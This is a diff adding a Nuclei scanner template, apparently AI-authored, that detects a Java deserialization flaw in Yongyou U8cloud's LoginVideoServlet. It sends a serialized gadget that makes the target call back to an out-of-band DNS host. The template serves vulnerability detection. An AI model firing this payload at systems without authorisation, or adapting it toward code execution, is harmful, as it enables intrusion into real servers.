@@ -1,0 +1,27 @@
+id: yongyou-u8cloud-loginvideoservlet-deserialization
+
+info:
+  name: Yongyou U8cloud LoginVideoServlet Deserialization
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: deserialization,dnslog
+
+variables:
+  reverse: "{{interactsh-url}}"
+  postdata: "{{generate_java_gadget('dns', reverse, 'raw')}}"
+
+http:
+  - raw:
+      - |
+        POST /servlet/~uap/nc.bs.sm.login2.LoginVideoServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-java-serialized-object
+
+        {{postdata}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
